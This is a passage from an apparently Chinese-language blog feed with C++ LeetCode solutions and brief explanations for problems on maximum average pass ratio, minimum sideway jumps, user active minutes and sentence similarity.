class="line">        <span class="keyword">return</span> res / len;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>虽然错了，但是这里的思路是正确的<br>根据糖水不等式， $ (a+c)&#x2F;(b+c) &gt; b &#x2F; a $<br>目标所有班级的糖水浓度之和的平均值最大，也就是浓度总和最大<br>每份糖应该加在能使得 $ diff &#x3D; (a+c)&#x2F;(b+c) - b &#x2F; a $ 最大化的位置上</p></blockquote><h3 id="优先队列"><a href="#优先队列" class="headerlink" title="优先队列"></a>优先队列</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">cmp</span> &#123;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &amp;a, pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&amp; b)</span> </span>&#123;</span><br><span class="line">        <span class="type">double</span> diff_a = (a.first + <span class="number">1.0</span>) / (a.second + <span class="number">1.0</span>) - <span class="number">1.0</span> * a.first / a.second;</span><br><span class="line">        <span class="type">double</span> diff_b = (b.first + <span class="number">1.0</span>) / (b.second + <span class="number">1.0</span>) - <span class="number">1.0</span> * b.first / b.second;</span><br><span class="line">        <span class="keyword">return</span> diff_a &lt; diff_b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">maxAverageRatio</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; classes, <span class="type">int</span> extraStudents)</span> </span>&#123;</span><br><span class="line">        <span class="type">double</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> len = classes.<span class="built_in">size</span>();</span><br><span class="line">        priority_queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;, vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;, cmp&gt; queue;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">            queue.<span class="built_in">push</span>(<span class="built_in">make_pair</span>(classes[j][<span class="number">0</span>], classes[j][<span class="number">1</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; extraStudents; i++) &#123;</span><br><span class="line">            <span class="keyword">auto</span> [x, y] = queue.<span class="built_in">top</span>();</span><br><span class="line">            queue.<span class="built_in">pop</span>();</span><br><span class="line">            queue.<span class="built_in">push</span>(<span class="built_in">make_pair</span>(x+<span class="number">1</span>, y+<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!queue.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">auto</span> [x, y] = queue.<span class="built_in">top</span>();</span><br><span class="line">            queue.<span class="built_in">pop</span>();</span><br><span class="line">            res += <span class="number">1.0</span>*x/y;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res / len;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>使用优先队列进行排序</p></blockquote><h3 id="用lambda"><a href="#用lambda" class="headerlink" title="用lambda"></a>用lambda</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">maxAverageRatio</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; classes, <span class="type">int</span> extraStudents)</span> </span>&#123;</span><br><span class="line">        <span class="type">double</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> len = classes.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">auto</span> diff = [&amp;](<span class="type">int</span> i) -&gt; <span class="type">double</span> &#123;<span class="built_in">return</span> (<span class="number">1.0</span>+classes[i][<span class="number">0</span>])/(<span class="number">1</span>+classes[i][<span class="number">1</span>]) - <span class="number">1.0</span>*classes[i][<span class="number">0</span>]/classes[i][<span class="number">1</span>];&#125;;</span><br><span class="line">        <span class="keyword">auto</span> cmp = [&amp;](<span class="type">int</span> i, <span class="type">int</span> j) -&gt; <span class="type">bool</span> &#123;<span class="keyword">return</span> <span class="built_in">diff</span>(i) &lt; <span class="built_in">diff</span>(j);&#125;;</span><br><span class="line">        priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, <span class="keyword">decltype</span>(cmp)&gt; <span class="built_in">queue</span>(cmp);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">            queue.<span class="built_in">push</span>(j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; extraStudents; i++) &#123;</span><br><span class="line">            <span class="type">int</span> j = queue.<span class="built_in">top</span>();</span><br><span class="line">            queue.<span class="built_in">pop</span>();</span><br><span class="line">            classes[j][<span class="number">0</span>]++;</span><br><span class="line">            classes[j][<span class="number">1</span>]++;</span><br><span class="line">            queue.<span class="built_in">push</span>(j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!queue.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> j = queue.<span class="built_in">top</span>();</span><br><span class="line">            queue.<span class="built_in">pop</span>();</span><br><span class="line">            res += <span class="number">1.0</span>*classes[j][<span class="number">0</span>]/classes[j][<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res / len;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>用lambda反而更慢了，不过知道了<code>decltype</code>的一个用法</p></blockquote><h2 id="1824-最少侧跳次数"><a href="#1824-最少侧跳次数" class="headerlink" title="1824. 最少侧跳次数"></a><a href="https://leetcode.cn/problems/minimum-sideway-jumps/">1824. 最少侧跳次数</a></h2><h3 id="贪心"><a href="#贪心" class="headerlink" title="贪心"></a>贪心</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minSideJumps</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; obstacles)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = obstacles.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">obstacles_lane</span>(n+<span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">3</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">            obstacles_lane[n][i] = n+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = n<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            obstacles_lane[i][<span class="number">0</span>] = obstacles_lane[i+<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">            obstacles_lane[i][<span class="number">1</span>] = obstacles_lane[i+<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">            obstacles_lane[i][<span class="number">2</span>] = obstacles_lane[i+<span class="number">1</span>][<span class="number">2</span>];</span><br><span class="line">            <span class="keyword">if</span>(obstacles[i] != <span class="number">0</span>) &#123;</span><br><span class="line">                obstacles_lane[i][obstacles[i]<span class="number">-1</span>] = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> jump = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = obstacles_lane[<span class="number">0</span>][<span class="number">1</span>]<span class="number">-1</span>; i &lt; n; ) &#123;</span><br><span class="line">            <span class="type">int</span> max_lane = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(obstacles_lane[i][j] &gt; obstacles_lane[i][max_lane]) &#123;</span><br><span class="line">                    max_lane = j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            jump++;</span><br><span class="line">            i = obstacles_lane[i][max_lane]<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> jump;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>贪心，先算出右侧最远的一个障碍的位置，直接跳到那一个跑道上，再向前移动<br>在初始的2号跑道上要先向前移动</p></blockquote><h3 id="dp"><a href="#dp" class="headerlink" title="dp"></a>dp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minSideJumps</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; obstacles)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = obstacles.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; dp = &#123;<span class="number">1</span>, <span class="number">0</span> ,<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> minCount = INT_MAX;</span><br><span class="line">            <span class="comment">//不跳</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(j == obstacles[i]<span class="number">-1</span>) &#123;</span><br><span class="line">                    dp[j] = INT_MAX;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    minCount = <span class="built_in">min</span>(minCount, dp[j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//跳</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(j == obstacles[i]<span class="number">-1</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    dp[j] = <span class="built_in">min</span>(dp[j], minCount+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span>(dp[<span class="number">0</span>], <span class="built_in">min</span>(dp[<span class="number">1</span>], dp[<span class="number">2</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>对于当前位置<code>i</code>的跑道<code>j</code><br>如果考虑不从<code>i-1</code>位置跳，当前到达当前跑到所用跳数不变，如果有障碍则是无穷如果考虑<br>如果跳到当前位置，前提是当前位置没有障碍，则是另外两个跑到跳数+1和自己本身跳数的最小值</p></blockquote><h2 id="1817-查找用户活跃分钟数"><a href="#1817-查找用户活跃分钟数" class="headerlink" title="1817. 查找用户活跃分钟数"></a><a href="https://leetcode.cn/problems/finding-the-users-active-minutes/">1817. 查找用户活跃分钟数</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">findingUsersActiveMinutes</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; logs, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, set&lt;<span class="type">int</span>&gt;&gt; UAM;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">answer</span><span class="params">(k, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; op:logs) &#123;</span><br><span class="line">            UAM[op[<span class="number">0</span>]].<span class="built_in">insert</span>(op[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> ite = UAM.<span class="built_in">begin</span>(); ite!=UAM.<span class="built_in">end</span>(); ite++) &#123;</span><br><span class="line">            answer[ite-&gt;second.<span class="built_in">size</span>()<span class="number">-1</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> answer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1813-句子相似性-III"><a href="#1813-句子相似性-III" class="headerlink" title="1813. 句子相似性 III"></a><a href="https://leetcode.cn/problems/sentence-similarity-iii/">1813. 句子相似性 III</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">areSentencesSimilar</span><span class="params">(string sentence1, string sentence2)</span> </span>&#123;</span><br><span class="line">        vector&lt;string&gt; splitSentence1 = <span class="built_in">split</span>(sentence1), splitSentence2 = <span class="built_in">split</span>(sentence2);</span><br><span class="line">        <span class="type">int</span> wordCount1 = splitSentence1.<span class="built_in">size</span>(), wordCount2 = splitSentence2.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(wordCount1 &lt; wordCount2) &#123;</span><br><span class="line">            vector&lt;string&gt; t = splitSentence1;</span><br><span class="line">            splitSentence1 = splitSentence2;</span><br><span class="line">            splitSentence2 = t;</span><br><span class="line">        &#125;</span><br><span class="line">        wordCount1 = splitSentence1.<span class="built_in">size</span>();wordCount2 = splitSentence2.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; wordCount1 &amp;&amp; splitSentence1[i] != splitSentence2[j]) i++;</span><br><span class="line">        <span class="type">int</span> count = i-j &gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; wordCount1 &amp;&amp; j &lt; wordCount2) &#123;</span><br><span class="line">            <span class="keyword">while</span>(i &lt; wordCount1 &amp;&amp; j &lt; wordCount2 &amp;&amp; splitSentence1[i] == splitSentence2[j]) &#123;</span><br><span class="line">                i++;j++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(j &lt; wordCount2) &#123;</span><br><span class="line">                <span class="keyword">while</span>(i &lt; wordCount1 &amp;&amp; splitSentence1[i] != splitSentence2[j]) &#123;</span><br><span class="line">                    i++;</span><br><span class="line">                &#125;</span><br><span class="line">                count++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(i &lt; wordCount1) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(count &lt;= <span class="number">1</span> &amp;&amp; j == wordCount2) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        i = wordCount1<span class="number">-1</span>;j = wordCount2<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &gt;= wordCount1 &amp;&amp; splitSentence1[i] != splitSentence2[j]) i--;</span><br><span class="line">        <span class="type">int</span> count1 = j-i &gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &gt;= <span class="number">0</span> &amp;&amp; j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span>(i &gt;= <span class="number">0</span> &amp;&amp; j &gt;= <span class="number">0</span> &amp;&amp; splitSentence1[i] == splitSentence2[j]) &#123;</span><br><span class="line">                i--;j--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>(i &gt;= <span class="number">0</span> &amp;&amp; splitSentence1[i] != splitSentence2[j]) &#123;</span><br><span class="line">                    i--;</span><br><span class="line">                &#125;</span><br><span class="line">                count1++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                count1++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (count1 &lt;=<span class="number">1</span> &amp;&amp; j == <span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">split</span><span class="params">(<span class="type">const</span> string&amp; str)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>, len = str.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;string&gt; res;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; len) &#123;</span><br><span class="line">            string subStr = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span>(i &lt; len &amp;&amp; str[i] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                subStr += str[i];</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="built_in">push_back</span>(subStr);</span><br><span class="line">            <span class="keyword">while</span>(i &lt; len &amp;&amp; str[i] == <span class="string">&#x27; &#x27;</span> ) i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>先split，再双指针<br>数较短的字符串将较长的字符串分成了几份，如果小于2，则ok<br>需要正着反着各尝试一遍</p></blockquote><h3 id="题解方法"><a href="#题解方法" class="headerlink" title="题解方法"></a>题解方法</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">areSentencesSimilar</span><span class="params">(string sentence1, string sentence2)</span> </span>&#123;</span><br><span class="line">        vector&lt;string&gt; splitSentence1 = <span class="built_in">split</span>(sentence1), splitSentence2 = <span class="built_in">split</span>(sentence2);</span><br><span class="line">        <span class="type">int</span> wordCount1 = splitSentence1.<span class="built_in">size</span>(), wordCount2 = splitSentence2.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; wordCount1 &amp;&amp; i &lt; wordCount2 &amp;&amp; splitSentence1[i] == splitSentence2[i]) i++;</span><br><span class="line">        <span class="keyword">while</span>(j &lt; wordCount1-i &amp;&amp; j &lt; wordCount2-i &amp;&amp; splitSentence1[wordCount1-j<span class="number">-1</span>] == splitSentence2[wordCount2-j<span class="number">-1</span>]) j++;</span><br><span class="line">        <span class="keyword">return</span> i+j == <span class="built_in">min</span>(wordCount1, wordCount2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">split</span><span class="params">(<span class="type">const</span> string&amp; str)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>, len = str.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;string&gt; res;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; len) &#123;</span><br><span class="line">            string subStr = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span>(i &lt; len &amp;&amp; str[i] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                subStr += str[i];</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="built_in">push_back</span>(subStr);</span><br><span class="line">            <span class="keyword">while</span>(i &lt; len &amp;&amp; str[i] == <span class="string">&#x27; &#x27;</span> ) i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>由于只能添加一段，先正向找相同的单词数，再反向找“不与正向重叠的”相同的单词数，如果两者单词数相加刚好等同于较短的字符串的单词数，说明可以通过插入一句话来使两个句子相同</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1234-替换子串得到平衡字符串&quot;&gt;&lt;a href=&quot;#1234-替换子串得到平衡字符串&quot; class=&quot;headerlink&quot; title=&quot;1234. 替换子串得到平衡字符串&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/replace-the-substring-for-balanced-string/&quot;&gt;1234. 替换子串得到平衡字符串&lt;/a&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;isBalance&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span 